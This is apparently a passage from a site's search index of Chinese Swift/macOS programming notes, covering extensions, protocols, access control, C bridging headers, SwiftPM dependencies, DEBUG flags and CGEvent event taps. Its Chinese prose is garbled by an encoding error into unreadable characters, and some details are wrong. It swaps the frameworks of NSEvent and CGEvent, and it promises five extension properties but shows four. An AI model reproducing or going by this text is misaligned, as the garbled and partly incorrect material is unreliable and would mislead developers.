åœ¨ä½ çš„ä»£ç é‡Œä½¿ç”¨ä½ æœŸæœ›çš„æ˜ç¡®çš„ç±»å‹æ€»æ˜¯æ›´å¥½çš„ã€‚ Swift æ‰©å±• æ‰©å±•å°±æ˜¯å‘ä¸€ä¸ªå·²æœ‰çš„ç±»ã€ç»“æ„ä½“æˆ–æšä¸¾ç±»å‹æ·»åŠ æ–°åŠŸèƒ½ã€‚ æ‰©å±•å¯ä»¥å¯¹ä¸€ä¸ªç±»å‹æ·»åŠ æ–°çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸èƒ½é‡å†™å·²æœ‰çš„åŠŸèƒ½ã€‚ è¯­æ³• æ‰©å±•å£°æ˜ä½¿ç”¨å…³é”®å­— extension: extension SomeType { // åŠ åˆ°SomeTypeçš„æ–°åŠŸèƒ½å†™åˆ°è¿™é‡Œ } ä¸€ä¸ªæ‰©å±•å¯ä»¥æ‰©å±•ä¸€ä¸ªå·²æœ‰ç±»å‹ï¼Œä½¿å…¶èƒ½å¤Ÿé€‚é…ä¸€ä¸ªæˆ–å¤šä¸ªåè®®ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹: extension SomeType: SomeProtocol, AnotherProctocol { // åè®®å®ç°å†™åˆ°è¿™é‡Œ } ä¸‹é¢çš„ä¾‹å­å‘ Int ç±»å‹æ·»åŠ äº† 5 ä¸ªè®¡ç®—å‹å®ä¾‹å±æ€§å¹¶æ‰©å±•å…¶åŠŸèƒ½: extension Int { var add: Int {return self + 100 } var sub: Int { return self - 10 } var mul: Int { return self * 10 } var div: Int { return self / 5 } } let addition = 3.add print(\"åŠ æ³•è¿ç®—åçš„å€¼ï¼š\\(addition)\") Swift åè®® åº”è¯¥å°±æ˜¯æ¥å£å§ åè®®çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹: protocol SomeProtocol { // åè®®å†…å®¹ } è¦ä½¿ç±»éµå¾ªæŸä¸ªåè®®ï¼Œéœ€è¦åœ¨ç±»å‹åç§°ååŠ ä¸Šåè®®åç§°ï¼Œä¸­é—´ä»¥å†’å·:åˆ†éš”. éµå¾ªå¤šä¸ªåè®®æ—¶ï¼Œå„åè®®ä¹‹é—´ç”¨é€—å·,åˆ†éš”: struct SomeStructure: FirstProtocol, AnotherProtocol { // ç»“æ„ä½“å†…å®¹ } å¦‚æœç±»åœ¨éµå¾ªåè®®çš„åŒæ—¶æ‹¥æœ‰çˆ¶ç±»ï¼Œåº”è¯¥å°†çˆ¶ç±»åæ”¾åœ¨åè®®åä¹‹å‰ï¼Œä»¥é€—å·åˆ†éš”: class SomeClass: SomeSuperClass, FirstProtocol, AnotherProtocol { // ç±»çš„å†…å®¹ } ç±»ä¸“å±åè®® å¯ä»¥åœ¨åè®®çš„ç»§æ‰¿åˆ—è¡¨ä¸­,é€šè¿‡æ·»åŠ classå…³é”®å­—,é™åˆ¶åè®®åªèƒ½é€‚é…åˆ°ç±»ï¼ˆclassï¼‰ç±»å‹ã€‚ è¯¥classå…³é”®å­—å¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªå‡ºç°åœ¨åè®®çš„ç»§æ‰¿åˆ—è¡¨ä¸­ï¼Œå…¶åï¼Œæ‰æ˜¯å…¶ä»–ç»§æ‰¿åè®®ã€‚æ ¼å¼å¦‚ä¸‹: protocol SomeClassOnlyProtocol: class, SomeInheritedProtocol { // åè®®å®šä¹‰ } Swift æ³›å‹ ç±»å‹çº¦æŸ å…³è”ç±» ä½¿ç”¨ associatedtype å…³é”®å­—æ¥è®¾ç½®å…³è”ç±»å‹å®ä¾‹ Where è¯­å¥ å¯ä»¥åœ¨å‚æ•°åˆ—è¡¨ä¸­é€šè¿‡whereè¯­å¥å®šä¹‰å‚æ•°çš„çº¦æŸ Swift è®¿é—®æ§åˆ¶ public å¯ä»¥è®¿é—®è‡ªå·±æ¨¡å—ä¸­æºæ–‡ä»¶é‡Œçš„ä»»ä½•å®ä½“ï¼Œåˆ«äººä¹Ÿå¯ä»¥é€šè¿‡å¼•å…¥è¯¥æ¨¡å—æ¥è®¿é—®æºæ–‡ä»¶é‡Œçš„æ‰€æœ‰å®ä½“ã€‚ internal å¯ä»¥è®¿é—®è‡ªå·±æ¨¡å—ä¸­æºæ–‡ä»¶é‡Œçš„ä»»ä½•å®ä½“ï¼Œä½†æ˜¯åˆ«äººä¸èƒ½è®¿é—®è¯¥æ¨¡å—ä¸­æºæ–‡ä»¶é‡Œçš„å®ä½“ã€‚ fileprivate æ–‡ä»¶å†…ç§æœ‰ï¼Œåªèƒ½åœ¨å½“å‰æºæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ private åªèƒ½åœ¨ç±»ä¸­è®¿é—®ï¼Œç¦»å¼€äº†è¿™ä¸ªç±»æˆ–è€…ç»“æ„ä½“çš„ä½œç”¨åŸŸå¤–é¢å°±æ— æ³•è®¿é—®ã€‚ æšä¸¾ç±»å‹è®¿é—®æƒé™ æšä¸¾ä¸­æˆå‘˜çš„è®¿é—®çº§åˆ«ç»§æ‰¿è‡ªè¯¥æšä¸¾ï¼Œä½ ä¸èƒ½ä¸ºæšä¸¾ä¸­çš„æˆå‘˜å•ç‹¬ç”³æ˜ä¸åŒçš„è®¿é—®çº§åˆ«ã€‚ å­ç±»è®¿é—®æƒé™ å­ç±»çš„è®¿é—®çº§åˆ«ä¸å¾—é«˜äºçˆ¶ç±»çš„è®¿é—®çº§åˆ«ã€‚ æ¯”å¦‚è¯´ï¼Œçˆ¶ç±»çš„è®¿é—®çº§åˆ«æ˜¯ internalï¼Œå­ç±»çš„è®¿é—®çº§åˆ«å°±ä¸èƒ½ç”³æ˜ä¸º publicã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Basic-grammar.html","loc":"/yq-doc-source-docs-rear-end-swift-Basic-grammar.html"},{"title":"æ¡¥æ¥å¯¼å…¥C","text":"æ³¨è§£ æºäºAI, æœ‰ç©ºæ•´ç† å¦‚æœä½ åœ¨ Swift ä¸­ä½¿ç”¨æ¡¥æ¥å¤´æ–‡ä»¶æ¥è®¿é—® C å¤´æ–‡ä»¶ä¸­çš„å®å®šä¹‰ï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š åˆ›å»ºæ¡¥æ¥å¤´æ–‡ä»¶ åœ¨ Xcode ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„å¤´æ–‡ä»¶ï¼ˆä¾‹å¦‚ YourProject-Bridging-Header.hï¼‰ã€‚ åœ¨æ¡¥æ¥å¤´æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ #import æˆ– #include å¯¼å…¥ libproc.h å¤´æ–‡ä»¶: #import <libproc.h> é…ç½®æ¡¥æ¥å¤´æ–‡ä»¶ï¼š åœ¨ Xcode é¡¹ç›®çš„ \"Build Settings\"ï¼ˆæ„å»ºè®¾ç½®ï¼‰ä¸­ï¼Œ æ‰¾åˆ° \"Objective-C Bridging Header\"ï¼ˆObjective-C æ¡¥æ¥å¤´æ–‡ä»¶ï¼‰è®¾ç½®ã€‚ å°†è®¾ç½®çš„å€¼æŒ‡å®šä¸ºæ¡¥æ¥å¤´æ–‡ä»¶çš„è·¯å¾„ï¼Œä¾‹å¦‚ YourProject/YourProject-Bridging-Header.hã€‚ åœ¨ Swift ä»£ç ä¸­ä½¿ç”¨å®å®šä¹‰ åœ¨ Swift æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡æ¡¥æ¥å¤´æ–‡ä»¶æ¥è®¿é—® libproc.h ä¸­çš„å®å®šä¹‰ã€‚ ä½¿ç”¨ #if é¢„å¤„ç†æŒ‡ä»¤æ¥æ£€æŸ¥å®å®šä¹‰çš„å€¼ï¼Œå¹¶åœ¨ä»£ç ä¸­åšå‡ºç›¸åº”çš„å¤„ç†: #if YOUR_MACRO // å®å®šä¹‰å­˜åœ¨æ—¶çš„å¤„ç†é€»è¾‘ #else // å®å®šä¹‰ä¸å­˜åœ¨æ—¶çš„å¤„ç†é€»è¾‘ #endif è¯·æ³¨æ„ï¼ŒSwift æ˜¯ä¸€ç§ä¸åŒäº C çš„è¯­è¨€ï¼Œå› æ­¤åœ¨ Swift æ–‡ä»¶ä¸­æ— æ³•ç›´æ¥è®¿é—® C å¤´æ–‡ä»¶ä¸­çš„å®å®šä¹‰ã€‚ é€šè¿‡æ¡¥æ¥å¤´æ–‡ä»¶ï¼Œä½ å¯ä»¥åœ¨ Objective-C å’Œ Swift ä¹‹é—´å»ºç«‹è¿æ¥ï¼Œä»è€Œä½¿ Swift ä»£ç èƒ½å¤Ÿè®¿é—® C å¤´æ–‡ä»¶ä¸­çš„å®å®šä¹‰å’Œå…¶ä»–å†…å®¹ã€‚ ç¡®ä¿åœ¨æ¡¥æ¥å¤´æ–‡ä»¶å’Œ Swift æ–‡ä»¶ä¹‹é—´è®¾ç½®äº†æ­£ç¡®çš„è·¯å¾„å’Œé…ç½®ï¼Œä»¥ä¾¿èƒ½å¤ŸæˆåŠŸè®¿é—® libproc.h ä¸­çš„å®å®šä¹‰","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Bridge-guidance-C.html","loc":"/yq-doc-source-docs-rear-end-swift-Bridge-guidance-C.html"},{"title":"å‘½ä»¤è¡Œå·¥å…·-åˆ›å»ºå¹¶è¿è¡Œé¡¹ç›®","text":"å®˜ç½‘: https://www.swift.org/getting-started/cli-swiftpm/ å¹³å°: MacOS ä»¥åˆ›å»ºä¸€ä¸ª Hello World ä½œä¸ºè¯´æ˜ é¡¹ç›®åˆ›å»ºä¸è¿è¡Œ åˆ›å»ºé¡¹ç›®: $ mkdir MyCLI $ cd MyCLI $ swift package init --name MyCLI --type executable ç”Ÿæˆä»¥ä¸‹ç»“æ„ç›®å½•æ–‡ä»¶: . â”œâ”€â”€ Package.swift â””â”€â”€ Sources â””â”€â”€ main.swift æ‰§è¡Œç¨‹åº: $ swift run MyCLI Building for debugging... [3/3] Linking MyCLI Build complete! (0.68s) Hello, world!","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Command-lines-create-and-run-the-project.html","loc":"/yq-doc-source-docs-rear-end-swift-Command-lines-create-and-run-the-project.html"},{"title":"DEBUGæ¡ä»¶","text":"ç”¨äºè®¾ç½®å¦‚æœæ˜¯å¼€å‘(DEBUG)ä¸­è¯¥åšä»€ä¹ˆ, æ­£å¼ç¯å¢ƒè¯¥åšä»€ä¹ˆ, å¦‚: #if DEBUG print(\"å¯èƒ½æ²¡æœ‰è·å–åˆ°è¾…åŠ©æƒé™, ç¡®è®¤åè¯·æ¸…ç†åæ‰‹åŠ¨è·å–\") #else // æ‰“å¼€è¯·æ±‚è¾…åŠ©æƒé™çª—å£ let _ = NoAccessView().openInWindow(title: \"è¯·æ±‚æˆæƒ\", sender: self) #endif å¦‚ä½•é…ç½®? æ‰“å¼€, ç¨‹åºé…ç½®é¡µé¢, é€‰æ‹© Build Settings , ç„¶åå¯ä»¥åœ¨ Filter ä¸­ æœç´¢ Custom Flags å¦‚å›¾æ‰€ç¤º, è¿˜éœ€åœ¨ Other Swift Flags ä¸­ è®¾ç½® Debug æ·»åŠ  -D DEBUG , æ³¨æ„ä¸è¦å’ŒReleaseä¸€èµ·æ·»åŠ ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Debug-condition.html","loc":"/yq-doc-source-docs-rear-end-swift-Debug-condition.html"},{"title":"äº‹ä»¶ç±»å‹","text":"HID äº‹ä»¶å’Œä¼šè¯äº‹ä»¶ HID äº‹ä»¶ï¼ˆHuman Interface Device Eventsï¼‰ HID äº‹ä»¶æ˜¯æŒ‡ç”±äººæœºäº¤äº’è®¾å¤‡ï¼ˆå¦‚é”®ç›˜ã€é¼ æ ‡ã€è§¦æ‘¸æ¿ç­‰ï¼‰äº§ç”Ÿçš„äº‹ä»¶ã€‚ ç”¨é€”ï¼šé€šè¿‡æˆªå– HID äº‹ä»¶ï¼Œä½ å¯ä»¥ç›‘è§†å’Œå“åº”ç”¨æˆ·ä¸è¾“å…¥è®¾å¤‡çš„äº¤äº’ï¼Œä¾‹å¦‚æŒ‰é”®ã€ç‚¹å‡»ã€æ»šåŠ¨ç­‰æ“ä½œã€‚ ä¼šè¯äº‹ä»¶ï¼ˆSession Eventsï¼‰ï¼š ä¼šè¯äº‹ä»¶æ˜¯æŒ‡ä¸ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ˆsessionï¼‰ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç”¨æˆ·ç™»å½•ã€æ³¨é”€ã€å±å¹•é”å®šç­‰ã€‚ ç”¨é€”ï¼šä¼šè¯äº‹ä»¶ä¸»è¦ç”¨äºç›‘è§†å’Œå“åº”ç”¨æˆ·ç™»å½•å’Œæ³¨é”€ç­‰ä¼šè¯çº§åˆ«çš„æ“ä½œï¼Œä»¥ä¾¿æ‰§è¡Œä¸ä¼šè¯çŠ¶æ€ç›¸å…³çš„ä»»åŠ¡æˆ–é€»è¾‘ã€‚ åŒºåˆ«ï¼š HID äº‹ä»¶æ˜¯ä¸äººæœºäº¤äº’è®¾å¤‡ï¼ˆè¾“å…¥è®¾å¤‡ï¼‰ç›¸å…³çš„äº‹ä»¶ï¼Œè€Œä¼šè¯äº‹ä»¶æ˜¯ä¸ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ˆsessionï¼‰ç›¸å…³çš„äº‹ä»¶ã€‚ HID äº‹ä»¶æ˜¯é’ˆå¯¹ç”¨æˆ·è¾“å…¥çš„å“åº”ï¼Œè€Œä¼šè¯äº‹ä»¶æ˜¯é’ˆå¯¹ç”¨æˆ·ç™»å½•å’Œæ³¨é”€ç­‰ä¼šè¯çº§åˆ«çš„æ“ä½œçš„å“åº”ã€‚ HID äº‹ä»¶å¯ä»¥æˆªå–å’Œå¤„ç†ï¼Œä»¥å®ç°è‡ªå®šä¹‰çš„äº¤äº’é€»è¾‘ï¼Œè€Œä¼šè¯äº‹ä»¶é€šå¸¸ç”±ç³»ç»Ÿæˆ–æ¡†æ¶å¤„ç†ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Event.html","loc":"/yq-doc-source-docs-rear-end-swift-Event.html"},{"title":"å¢åŠ ä¾èµ–","text":"æ–¹æ¡ˆä¸€ - Xcode: é€‰æ‹©èœå•æ çš„ File > Add Package Dependency , ç„¶åè¾“å…¥ä»“åº“URL å‚è€ƒ: https://developer.apple.com/documentation/xcode/adding-package-dependencies-to-your-app å¦‚æœæ²¡æ‰¾åˆ°çš„è¯(ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘å°±æ²¡æœ‰è¿™ä¸ªé¡¹), å°±å»é¡¹ç›®çš„ General , ä¸‹æ‹‰æ‰¾åˆ° Frameworks, Libraries, and Embedded Content , å¦‚å›¾: ç„¶åæ·»åŠ ä¾èµ–å³å¯ æ•ˆæœå°±æ˜¯åœ¨æ ¹ç›®å½•ä¸‹å¢åŠ ä¸€ä¸ª Package.resolved æ–‡ä»¶: { \"pins\" : [ { \"identity\" : \"keyboardshortcuts\", \"kind\" : \"remoteSourceControl\", \"location\" : \"https://github.com/sindresorhus/KeyboardShortcuts.git\", \"state\" : { \"revision\" : \"c252200141e4abaecf30c14ea474dc009f56d553\", \"version\" : \"1.16.1\" } } ], \"version\" : 2 } æ–¹æ¡ˆäºŒ - å®˜æ–¹åŒ…(æ–‡ä»¶)ç®¡ç†å™¨: é¡¹ç›®æ ¹åˆ›å»º Package.swift å®šä¹‰ä¾èµ–é¡¹å’Œç‰ˆæœ¬ å†…å®¹ä¾‹(ä¸»è¦æ˜¯ä¸¤ä¸ª dependencies ä»¥åŠ å¤´éƒ¨çš„ç‰ˆæœ¬å®šä¹‰): // swift-tools-version: 5.8 // The swift-tools-version declares the minimum version of Swift required to build this package. import PackageDescription let package = Package( name: \"CQ\", dependencies: [ // æŒ‡å®š tag .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", from: \"1.16.1\"), // æˆ–è€…æŒ‡å®š branch // .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", branch: \"main\") ], targets: [ // Targets are the basic building blocks of a package, defining a module or a test suite. // Targets can depend on other targets in this package and products from dependencies. .executableTarget( name: \"CQ\", dependencies: [ .product(name: \"KeyboardShortcuts\", package: \"keyboardshortcuts\") ], path: \"CQ\"), ] ) å®šä¹‰å¥½ä¹‹åæ‰§è¡Œ swift build å³å¯ æ³¨è§£ Xcodeç¼–è¾‘å™¨å¯èƒ½ä¼šæç¤º PackageDescription æ‰¾ä¸åˆ° çš„æŠ¥é”™, å¿½ç•¥å³å¯ åˆ›å»ºå‘å¸ƒå¯å‚è€ƒ: https://www.jianshu.com/p/44560fd214d2 éƒ¨åˆ†å±æ€§è¯´æ˜: name: ä¸€èˆ¬å°±æ˜¯äº§å“/é¡¹ç›®å dependencies: ä¾èµ–è·¯å¾„, æ”¯æŒå¤šç§è·¯å¾„ç±»å‹: git æº + ç¡®å®šçš„ç‰ˆæœ¬å· git æº + ç‰ˆæœ¬åŒºé—´ git æº + Commit å· git æº + åˆ†æ”¯å æœ¬åœ°è·¯å¾„ targets: ç›®æ ‡, å¯ä»¥æœ‰å¤šä¸ª targets.name: name targets.dependencies: ä¸ä¸Šé¢çš„ä¾èµ–ä¸ä¸€æ ·, å¯ä»¥ä¾èµ–ä¸Šé¢ Package.Dependency çš„ä¸œè¥¿æˆ–è€…ä¾èµ–å¦ä¸€ä¸ª targetã€‚ æ‰€ä»¥è¿™é‡Œåªéœ€è¦å†™ Package æˆ–è€… Target çš„åå­—å­—ç¬¦ä¸²ï¼ˆTarget.Dependency è¿™ä¸ªæšä¸¾ä¹Ÿå®ç°äº† ExpressibleByStringLiteralï¼‰ã€‚ targets.path: target çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º [PackageRoot]/Sources/[TargetName] targets.source: æºæ–‡ä»¶è·¯å¾„ï¼Œé»˜è®¤ TargetName æ–‡ä»¶å¤¹ä¸‹éƒ½æ˜¯æºä»£ç æ–‡ä»¶ï¼Œä¼šé€’å½’æœç´¢ targets.exclude: éœ€è¦è¢«æ’é™¤åœ¨å¤–çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼Œè¿™äº›æ–‡ä»¶ä¸ä¼šå‚ä¸ç¼–è¯‘ã€‚ targets.publicHeadersPath: C å®¶æ—åº“çš„å…¬å…±å¤´æ–‡ä»¶åœ°å€ã€‚ targets.swiftSettings: å®šä¹‰ä¸€ä¸ªç”¨äºç‰¹å®šç¯å¢ƒï¼ˆä¾‹å¦‚ Debugï¼‰çš„å®ï¼Œéœ€è¦è®¾ç½®çš„è¯å¯ä»¥å» API ä¸Šç ”ç©¶ä¸‹ targets.linkerSettings: ç”¨äºé“¾æ¥ä¸€äº›ç³»ç»Ÿåº“ è¿™ä¸ªæˆ‘å¤±è´¥äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆ æ–¹æ¡ˆä¸‰ - Podç®¡ç†å™¨: ç±»ä¼¼äºJavaçš„Maven å®‰è£…é…ç½®ä½¿ç”¨å‚è€ƒ ./åŒ…ç®¡ç†å·¥å…·pod","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Increase-dependence.html","loc":"/yq-doc-source-docs-rear-end-swift-Increase-dependence.html"},{"title":"å®˜æ–¹åº“","text":"UIKit ç§»åŠ¨ç«¯ç”¨ Cocoa OS xæ¡Œé¢ç«¯ç”¨ åŒ…å« AppKit: å®˜æ–¹æ–‡æ¡£: https://developer.apple.com/documentation/appkit Foundation SwiftUI è¾ƒæ–°çš„æ¡†æ¶, è·¨å¹³å°æ”¯æŒ(æ¡Œé¢/ç§»åŠ¨) ä¸€äº›åº“å¯¹è±¡/å‡½æ•° NSEvent æ˜¯Core Graphicsæ¡†æ¶æä¾›çš„äº‹ä»¶å¤„ç†ç±»ã€‚ ä¸€ä¸ªæ¯”è¾ƒåº•å±‚çš„äº‹ä»¶ç±», ç”¨äºå¤„ç†ä¸å›¾å½¢æ¸²æŸ“å’Œçª—å£æœåŠ¡ç›¸å…³çš„äº‹ä»¶ã€‚ CGEventå¯ä»¥ç”¨äºæ¨¡æ‹Ÿå’Œå¤„ç†é¼ æ ‡ã€é”®ç›˜ã€è§¦æ‘¸ç­‰ä½çº§è¾“å…¥äº‹ä»¶ã€‚ å®ƒæä¾›äº†æ›´åº•å±‚çš„æ§åˆ¶ï¼Œå¯ä»¥ç›´æ¥æ“ä½œäº‹ä»¶çš„å±æ€§ï¼Œå¦‚ä½ç½®ã€æŒ‰é”®çŠ¶æ€ç­‰ã€‚ CGEvent AppKitæ¡†æ¶æä¾›çš„äº‹ä»¶å¤„ç†ç±». æ˜¯ä¸€ä¸ªè¾ƒé«˜å±‚çš„äº‹ä»¶å¤„ç†æ¥å£ï¼Œç”¨äºå¤„ç†ä¸åº”ç”¨ç¨‹åºç•Œé¢å’Œç”¨æˆ·äº¤äº’ç›¸å…³çš„äº‹ä»¶ã€‚ NSEventæä¾›äº†ä¸€äº›é«˜çº§çš„åŠŸèƒ½ï¼Œå¦‚è‡ªåŠ¨å¤„ç†æŒ‰é”®é‡å¤ã€å¤šç‚¹è§¦æ§ã€æ‰‹åŠ¿è¯†åˆ«ç­‰ã€‚ å®ƒè¿˜æä¾›äº†æ›´é«˜çº§çš„äº‹ä»¶å¤„ç†æ–¹æ³•ï¼Œå¦‚å“åº”é“¾ã€äº‹ä»¶åˆ†å‘ç­‰ã€‚ CGEvent.tapCreate åˆ›å»ºä¸€ä¸ªäº‹ä»¶æˆªå–, å‚è€ƒ: https://developer.apple.com/documentation/coregraphics/cgevent/1454426-tapcreate å‚æ•°åˆ—è¡¨: (tap: CGEventTapLocation, place: CGEventTapPlacement, options: CGEventTapOptions, eventsOfInterest: CGEventMask, callback: CGEventTapCallBack, userInfo: UnsafeMutableRawPointer?) -> CFMachPort? ä¸»è¦è¯´ä¸€ä¸‹ eventsOfInterest: CGEventMask , è¿™ä¸ªæ˜¯ä¸€ä¸ªä½æ©ç é›†åˆ, æ ‡è¯†æˆªå–çš„äº‹ä»¶ç±»å‹, æ¯”å¦‚ CGEventMask(1 << NSEvent.EventType.keyDown.rawValue) , å¤šä¸ªäº‹ä»¶ç”¨ | æ•´åˆ. å·¦ç§»ä¸€ä½è¡¨ç¤ºè½¬æ¢ä¸ºä½æ©ç  å…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°Callableæ˜¯ä¸ªå›è°ƒå‡½æ•°, ç”¨äºå¤„ç†äº‹ä»¶ éœ€è¦è¿”å›ä¸€ä¸ªcgEventçš„æŒ‡é’ˆ(), å‡½æ•°ç­¾åä¸º CGEventRef (*)(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) (è¿”å›ä¸€ä¸ªCGEventRefå¯¹è±¡ï¼Œå³ä¸€ä¸ªCGEventç±»å‹çš„å¼•ç”¨) å›è°ƒå‡½æ•°è´Ÿè´£åˆ›å»ºå’Œè¿”å›CGEventRefå¯¹è±¡ï¼Œå¹¶æ§åˆ¶å¯¹è¯¥å¯¹è±¡çš„å†…å­˜ç®¡ç† å›è°ƒè¿”å›çš„cgEventæœ‰ä¸¤ä¸ªå¯ç”¨çš„ä¿®é¥°: passRetainedï¼šåœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œå¦‚æœä½ ä½¿ç”¨passRetainedæ¥è¿”å›CGEventRefå¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºä½ å°†å†…å­˜ç®¡ç†æƒè½¬ç§»ç»™è°ƒç”¨æ–¹ã€‚ è¿™æ„å‘³ç€ï¼Œè°ƒç”¨æ–¹éœ€è¦è´Ÿè´£åœ¨é€‚å½“çš„æ—¶å€™è°ƒç”¨CFReleaseæ¥é‡Šæ”¾CGEventRefå¯¹è±¡ï¼Œä»¥ç¡®ä¿æ­£ç¡®é‡Šæ”¾å†…å­˜å¹¶é¿å…å†…å­˜æ³„æ¼ã€‚ è¿™é€šå¸¸é€‚ç”¨äºä½ åœ¨å›è°ƒå‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„CGEventRefå¯¹è±¡ï¼Œå¹¶å¸Œæœ›è°ƒç”¨æ–¹è´Ÿè´£ç®¡ç†å…¶ç”Ÿå‘½å‘¨æœŸã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨CGEventCreateCopyå‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„äº‹ä»¶å‰¯æœ¬ï¼Œå¹¶é€šè¿‡passRetainedè¿”å›ï¼Œ é‚£ä¹ˆè°ƒç”¨æ–¹éœ€è¦è´Ÿè´£åœ¨ä¸å†éœ€è¦è¯¥äº‹ä»¶æ—¶è°ƒç”¨CFReleaseæ¥é‡Šæ”¾å®ƒã€‚ passUnretainedï¼šåœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œå¦‚æœä½ ä½¿ç”¨passUnretainedæ¥è¿”å›CGEventRefå¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºä½ ä¸ä¼šè½¬ç§»å†…å­˜ç®¡ç†æƒç»™è°ƒç”¨æ–¹ã€‚ è¿™æ„å‘³ç€ï¼Œè°ƒç”¨æ–¹ä¸éœ€è¦è°ƒç”¨CFReleaseé‡Šæ”¾CGEventRefå¯¹è±¡ï¼Œå› ä¸ºä½ ä¿ç•™äº†å¯¹è¯¥å¯¹è±¡çš„æ‰€æœ‰æƒã€‚ è¿™é€šå¸¸é€‚ç”¨äºä½ åœ¨å›è°ƒå‡½æ•°ä¸­è¿”å›äº†ä¸€ä¸ªæŒ‡å‘å…¨å±€æˆ–é™æ€å˜é‡çš„CGEventRefå¯¹è±¡ï¼Œ æˆ–è€…ä½ ä»å…¶ä»–åœ°æ–¹è·å–çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯åœ¨å›è°ƒå‡½æ•°ä¸­åˆ›å»ºçš„æ–°å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨å›è°ƒå‡½æ•°ä¸­è¿”å›ä¸€ä¸ªå…¨å±€å˜é‡ä¸­å­˜å‚¨çš„äº‹ä»¶å¯¹è±¡ï¼Œæˆ–è€…ä½ é€šè¿‡ä¼ é€’æŒ‡é’ˆå‚æ•°è·å–ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œ ç„¶åä½¿ç”¨passUnretainedè¿”å›ï¼Œé‚£ä¹ˆè°ƒç”¨æ–¹ä¸éœ€è¦è°ƒç”¨CFReleaseé‡Šæ”¾å®ƒã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œä½¿ç”¨passRetainedè¡¨ç¤ºä½ å°†å†…å­˜ç®¡ç†æƒè½¬ç§»ç»™è°ƒç”¨æ–¹ï¼Œè°ƒç”¨æ–¹éœ€è¦è´Ÿè´£é‡Šæ”¾å¯¹è±¡ã€‚ è€Œä½¿ç”¨passUnretainedè¡¨ç¤ºä½ ä¿ç•™äº†å†…å­˜ç®¡ç†æƒï¼Œè°ƒç”¨æ–¹æ— éœ€é‡Šæ”¾å¯¹è±¡ã€‚ ä½ åº”æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©é€‚å½“çš„å†…å­˜ç®¡ç†æ–¹å¼ï¼Œä»¥ç¡®ä¿æ­£ç¡®å¤„ç†å†…å­˜ç”Ÿå‘½å‘¨æœŸã€‚ (è¿™éƒ¨åˆ†æ¥è‡ªAI) æ³¨è§£ å¦å¤–è‡ªå·±ä½¿ç”¨ CGEvent æ—¶, å°½é‡ä¸è¦å»å¼ºè½¬ä¸º NSEvent: let nsEvent = NSEvent(cgEvent: cgEvent), å› ä¸ºæœ‰æ—¶å€™åœ¨è¿™è½¬äº†å, è¿”å›çš„cgEvent, åœ¨åº•å±‚è°ƒç”¨å¯èƒ½ä¼šæŠ¥é”™: Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 ... com.apple.NSEventThread (7): EXC_BREAKPOINT (code=1, subcode=0x18307be7c) Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 DispatchQueue æ‰§è¡Œä»»åŠ¡çš„è°ƒåº¦é˜Ÿåˆ—, æ”¯æŒå¼‚æ­¥æ‰§è¡Œ DispatchQueue æ˜¯ä¸€ä¸ªç”¨äºæ‰§è¡Œä»»åŠ¡çš„è°ƒåº¦é˜Ÿåˆ—ï¼Œå®ƒæ˜¯åœ¨Grand Central Dispatch (GCD) ä¸­æä¾›çš„ä¸»è¦ç±»ä¹‹ä¸€ã€‚ GCDæ˜¯ä¸€ä¸ªç”¨äºå¹¶å‘æ‰§è¡Œä»»åŠ¡çš„åº•å±‚ç³»ç»Ÿæ¡†æ¶ï¼Œå®ƒæä¾›äº†ä¸€ç§ç®€å•è€Œå¼ºå¤§çš„æ–¹å¼æ¥ç®¡ç†å¹¶å‘ä»»åŠ¡çš„æ‰§è¡Œã€‚ DispatchQueue å¯ä»¥å°†ä»»åŠ¡ï¼ˆä»£ç å—ï¼‰å®‰æ’åˆ°ä¸åŒçš„é˜Ÿåˆ—ä¸­ï¼Œå¹¶æŒ‰ç…§ç‰¹å®šçš„è°ƒåº¦æ–¹å¼è¿›è¡Œæ‰§è¡Œã€‚å®ƒæä¾›äº†ä¸¤ç§ç±»å‹çš„é˜Ÿåˆ—ï¼š Serial 